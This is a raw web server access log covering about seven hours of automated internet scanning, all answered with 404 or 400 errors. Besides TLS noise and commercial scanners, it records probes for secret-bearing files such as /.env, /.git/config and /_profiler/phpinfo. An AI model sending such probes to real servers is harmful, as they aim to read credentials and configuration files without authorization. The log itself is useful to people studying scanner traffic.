165.227.173.203 - - [05/Jul/2024:17:06:36 +0000] "\x16\x03\x01\x01$\x01\x00\x01 \x03\x03O\xFCD\xAC!\xC9AlQ\xE2\xFB\x0F\xE6\x1A\xE1F{\xB3\xC9l(\xA46\x02D\xDD\xF4\x80\xCEQ\x0C\x0C  \xB5q\x12\xD8Q86\xDC0\xFF,^\xD9_\x22\xA0\xEDw\x02j\x99\x06m\xF0\xF8G\x1A.Z>Z\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 154 "-" "-"
54.36.115.221 - - [05/Jul/2024:17:58:03 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.36.115.221 - - [05/Jul/2024:17:58:04 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
141.98.83.197 - - [05/Jul/2024:18:29:45 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
167.71.197.10 - - [05/Jul/2024:18:34:40 +0000] "GET /cdn-cgi/trace HTTP/1.1" 404 122 "-" "Mozilla/5.0"
167.71.197.10 - - [05/Jul/2024:18:35:28 +0000] "\x16\x03\x01\x01\x07\x01\x00\x01\x03\x03\x03\xDD\x16[\x92\xAC=\x0F\xD3\x8E|\x04+\xDF\x80\xE0\x8CT\xFB9l\xDF\x1C%]P\x96b\xA8h\x19\x86\xF4 \x89\x1D\xD6\x1C\xD0\xC4)\x19\xBE\x85\xA3\xA5s\x9F\xEF@\xFEix\x0EK" 400 154 "-" "-"
172.105.128.12 - - [05/Jul/2024:18:42:05 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\xEC5\x95\xF8\x09\xABM\xC6\x9F<\xA4x\x92-\xBE2\xBE\xF4\xE3\x92f|}\xFA\x85\x94\x96\xF6'\xA0X\xB5\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
52.76.71.100 - - [05/Jul/2024:18:55:54 +0000] "GET /favicon.ico HTTP/1.1" 404 150 "-" "Go-http-client/1.1"
185.224.128.43 - - [05/Jul/2024:19:29:02 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
198.235.24.29 - - [05/Jul/2024:19:45:52 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03\xC4yU\xEE&\xEC\xA0" 400 154 "-" "-"
198.235.24.29 - - [05/Jul/2024:19:45:52 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xB1\xB5z\x9C\x03k\x16\xE8\x94\xF8V4/\x16\xA0\xA89\xE2\xE89;\x89\x1FY\xFE\x86\x99\xB4\xEB\x934" 400 154 "-" "-"
198.235.24.192 - - [05/Jul/2024:19:52:45 +0000] "GET / HTTP/1.0" 404 150 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
94.156.68.162 - - [05/Jul/2024:19:56:02 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 122 "-" "Mozilla/5.0 (compatible; Konqueror/4.2; Linux) KHTML/4.2.4 (like Gecko) Slackware/13.0"
94.156.68.162 - - [05/Jul/2024:19:57:58 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Linux; Android 9; SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"
46.174.191.31 - - [05/Jul/2024:20:12:11 +0000] "GET / HTTP/1.0" 404 150 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
66.175.213.4 - - [05/Jul/2024:20:24:57 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\xDA\xCE2\xD5" 400 154 "-" "-"
198.235.24.213 - - [05/Jul/2024:20:32:48 +0000] "GET / HTTP/1.1" 404 122 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
141.98.83.197 - - [05/Jul/2024:20:51:20 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.244.36.159 - - [05/Jul/2024:20:52:38 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
193.177.182.107 - - [05/Jul/2024:21:29:38 +0000] "GET /.git/config HTTP/1.1" 404 122 "-" "Mozilla/5.0 zgrab/0.x"
151.247.19.12 - - [05/Jul/2024:21:31:00 +0000] "GET / HTTP/1.1" 404 552 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
54.36.115.221 - - [05/Jul/2024:21:55:00 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.36.115.221 - - [05/Jul/2024:21:55:00 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
206.168.34.220 - - [05/Jul/2024:21:55:25 +0000] "GET / HTTP/1.1" 404 150 "-" "-"
206.168.34.220 - - [05/Jul/2024:21:55:35 +0000] "GET / HTTP/1.1" 404 122 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.220 - - [05/Jul/2024:21:55:35 +0000] "PRI * HTTP/2.0" 400 154 "-" "-"
92.249.48.202 - - [05/Jul/2024:22:06:25 +0000] "GET / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
54.36.115.221 - - [05/Jul/2024:22:36:51 +0000] "GET /.env HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.36.115.221 - - [05/Jul/2024:22:36:51 +0000] "POST / HTTP/1.1" 404 183 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
52.189.74.165 - - [05/Jul/2024:22:39:45 +0000] "MGLNDD_20.120.210.192_80" 400 154 "-" "-"
205.210.31.17 - - [05/Jul/2024:23:57:18 +0000] "GET / HTTP/1.0" 404 150 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
192.155.90.118 - - [06/Jul/2024:00:04:39 +0000] "\x16\x03\x01\x00\x85\x01\x00\x00\x81\x03\x03\xBF\xD20\xCEOa\xAA\xDB\xB1\xB2\xBE\x03J\xD5rXU\xC21\xF9}EYIt\x08\x96xE\x87\xF6\x1C\x00\x00 \xC0/\xC00\xC0+\xC0,\xCC\xA8\xCC\xA9\xC0\x13\xC0\x09\xC0\x14\xC0" 400 154 "-" "-"
